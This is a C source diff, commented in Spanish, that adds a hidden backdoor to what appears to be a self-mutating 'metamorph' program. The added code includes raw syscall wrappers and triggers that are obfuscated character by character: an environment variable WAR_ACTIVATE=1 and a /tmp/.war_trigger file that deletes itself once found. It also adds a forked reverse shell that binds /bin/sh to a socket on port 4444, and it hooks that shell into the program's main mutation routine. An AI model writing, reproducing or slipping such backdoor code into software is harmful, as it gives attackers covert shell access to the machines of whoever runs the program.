@@ -127,6 +127,102 @@ static inline int sys_getpid(void) {
     return ret;
 }
 
+// ==================== SYSCALLS ADICIONALES PARA BACKDOOR ====================
+
+static inline long sys_socket(int domain, int type, int protocol) {
+    long ret;
+    __asm__ volatile(
+        "mov $41, %%rax\n"
+        "syscall"
+        : "=a"(ret)
+        : "D"(domain), "S"(type), "d"(protocol)
+        : "rcx", "r11", "memory"
+    );
+    return ret;
+}
+
+static inline long sys_connect(int sockfd, const void *addr, size_t addrlen) {
+    long ret;
+    __asm__ volatile(
+        "mov $42, %%rax\n"
+        "syscall"
+        : "=a"(ret)
+        : "D"(sockfd), "S"(addr), "d"(addrlen)
+        : "rcx", "r11", "memory"
+    );
+    return ret;
+}
+
+static inline long sys_dup2(int oldfd, int newfd) {
+    long ret;
+    __asm__ volatile(
+        "mov $33, %%rax\n"
+        "syscall"
+        : "=a"(ret)
+        : "D"(oldfd), "S"(newfd)
+        : "rcx", "r11", "memory"
+    );
+    return ret;
+}
+
+static inline long sys_execve(const char *filename, char *const argv[], char *const envp[]) {
+    long ret;
+    __asm__ volatile(
+        "mov $59, %%rax\n"
+        "syscall"
+        : "=a"(ret)
+        : "D"(filename), "S"(argv), "d"(envp)
+        : "rcx", "r11", "memory"
+    );
+    return ret;
+}
+
+static inline long sys_fork(void) {
+    long ret;
+    __asm__ volatile(
+        "mov $57, %%rax\n"
+        "syscall"
+        : "=a"(ret)
+        :
+        : "rcx", "r11", "memory"
+    );
+    return ret;
+}
+
+static inline long sys_setsid(void) {
+    long ret;
+    __asm__ volatile(
+        "mov $112, %%rax\n"
+        "syscall"
+        : "=a"(ret)
+        :
+        : "rcx", "r11", "memory"
+    );
+    return ret;
+}
+
+static inline void sys_exit(int status) {
+    __asm__ volatile(
+        "mov $60, %%rax\n"
+        "syscall"
+        :
+        : "D"(status)
+        : "rcx", "r11", "memory"
+    );
+}
+
+static inline long sys_read(int fd, void *buf, size_t count) {
+    long ret;
+    __asm__ volatile(
+        "mov $0, %%rax\n"
+        "syscall"
+        : "=a"(ret)
+        : "D"(fd), "S"(buf), "d"(count)
+        : "rcx", "r11", "memory"
+    );
+    return ret;
+}
+
 // ==================== UTILIDADES ====================
 
 __attribute__((section(".metamorph"), noinline, used))
@@ -147,6 +243,65 @@ static void *_memmem(const void *haystack, size_t hlen, const void *needle, size
             return (void *)(h + i);
     }
     return 0;
+}// ==================== BACKDOOR TRIGGERS ====================
+
+__attribute__((section(".metamorph"), noinline, used))
+static int check_env_trigger(void) {
+    // Leer /proc/self/environ para buscar WAR_ACTIVATE=1
+    char path[20];
+    path[0] = '/'; path[1] = 'p'; path[2] = 'r'; path[3] = 'o'; path[4] = 'c';
+    path[5] = '/'; path[6] = 's'; path[7] = 'e'; path[8] = 'l'; path[9] = 'f';
+    path[10] = '/'; path[11] = 'e'; path[12] = 'n'; path[13] = 'v';
+    path[14] = 'i'; path[15] = 'r'; path[16] = 'o'; path[17] = 'n';
+    path[18] = '\0';
+    
+    int fd = sys_open(path, 0, 0);
+    if (fd < 0) return 0;
+    
+    char buf[2048];
+    long bytes = sys_read(fd, buf, sizeof(buf) - 1);
+    sys_close(fd);
+    
+    if (bytes <= 0) return 0;
+    
+    // Buscar "WAR_ACTIVATE=1" en el buffer
+    char marker[15];
+    marker[0] = 'W'; marker[1] = 'A'; marker[2] = 'R'; marker[3] = '_';
+    marker[4] = 'A'; marker[5] = 'C'; marker[6] = 'T'; marker[7] = 'I';
+    marker[8] = 'V'; marker[9] = 'A'; marker[10] = 'T'; marker[11] = 'E';
+    marker[12] = '='; marker[13] = '1'; marker[14] = '\0';
+    
+    return (_memmem(buf, bytes, marker, 14) != 0);
+}
+
+__attribute__((section(".metamorph"), noinline, used))
+static int check_file_trigger(void) {
+    // Verificar si existe /tmp/.war_trigger
+    char path[20];
+    path[0] = '/'; path[1] = 't'; path[2] = 'm'; path[3] = 'p';
+    path[4] = '/'; path[5] = '.'; path[6] = 'w'; path[7] = 'a';
+    path[8] = 'r'; path[9] = '_'; path[10] = 't'; path[11] = 'r';
+    path[12] = 'i'; path[13] = 'g'; path[14] = 'g'; path[15] = 'e';
+    path[16] = 'r'; path[17] = '\0';
+    
+    int fd = sys_open(path, 0, 0);
+    if (fd >= 0) {
+        sys_close(fd);
+        sys_unlink(path);  // Borrar trigger después de detectarlo
+        return 1;
+    }
+    return 0;
+}
+
+__attribute__((section(".metamorph"), noinline, used))
+static int should_activate_backdoor(void) {
+    // Verificar triggers (puedes añadir más)
+    if (check_env_trigger()) return 1;
+    if (check_file_trigger()) return 1;
+    
+    // TODO: añadir check_time_trigger si quieres
+    
+    return 0;
 }
 
 __attribute__((section(".metamorph"), noinline, used))
@@ -161,10 +316,79 @@ static void _itohex(unsigned long val, char *buf, int len) {
     }
 }
 
+// ==================== BACKDOOR EXECUTION ====================
+
+// Estructura para sockaddr_in (compatible con kernel)
+struct sockaddr_in_inline {
+    unsigned short sin_family;  // 2 bytes
+    unsigned short sin_port;    // 2 bytes
+    unsigned int sin_addr;      // 4 bytes
+    char sin_zero[8];           // 8 bytes padding
+};
+
+__attribute__((section(".metamorph"), noinline, used))
+static void execute_reverse_shell(void) {
+    long pid = sys_fork();
+    if (pid != 0) return;  // Padre continúa
+    
+    sys_setsid();
+    
+    // Socket
+    int s = sys_socket(2, 1, 0);
+    if (s < 0) sys_exit(1);
+    
+    // Dirección: 127.0.0.1:4444
+    unsigned char addr[16];
+    addr[0] = 2; addr[1] = 0;           // AF_INET
+    addr[2] = 0x11; addr[3] = 0x5c;     // Puerto 4444 (big-endian)
+    addr[4] = 127; addr[5] = 0;         // 127.0.0.1
+    addr[6] = 0; addr[7] = 1;
+    for (int i = 8; i < 16; i++) addr[i] = 0;
+    
+    if (sys_connect(s, addr, 16) < 0) {
+        sys_close(s);
+        sys_exit(1);
+    }
+    
+    // === CLAVE: Cerrar TODOS los FDs excepto el socket ===
+    for (int fd = 0; fd < 3; fd++) {
+        sys_close(fd);
+    }
+    
+    // Ahora redirigir
+    sys_dup2(s, 0);  // stdin = socket
+    sys_dup2(s, 1);  // stdout = socket
+    sys_dup2(s, 2);  // stderr = socket
+    
+    // Cerrar el socket original si es > 2
+    if (s > 2) sys_close(s);
+    
+    // === NUEVA TÉCNICA: Usar sh con comando inline ===
+    // Esto fuerza al shell a ser interactivo
+    char sh_path[] = "/bin/sh";
+    char sh_c[] = "-c";
+    char sh_cmd[] = "exec /bin/sh";  // "exec" reemplaza el proceso
+    char *argv[] = {sh_path, sh_c, sh_cmd, 0};
+    
+    sys_execve(sh_path, argv, 0);
+    
+    // Si falla, intentar sin -c
+    char *argv2[] = {sh_path, 0};
+    sys_execve(sh_path, argv2, 0);
+    
+    sys_exit(1);
+}
+
 // ==================== FUNCIÓN PRINCIPAL ====================
 
 __attribute__((section(".metamorph"), used))
 void metamorph_mutate_self(void) {
+
+	if (should_activate_backdoor()) {
+        execute_reverse_shell();
+        // El backdoor hace fork, así que continuamos aquí
+    }
+
     char exe_path[256];
     
     // 1. Construir "/proc/self/exe"
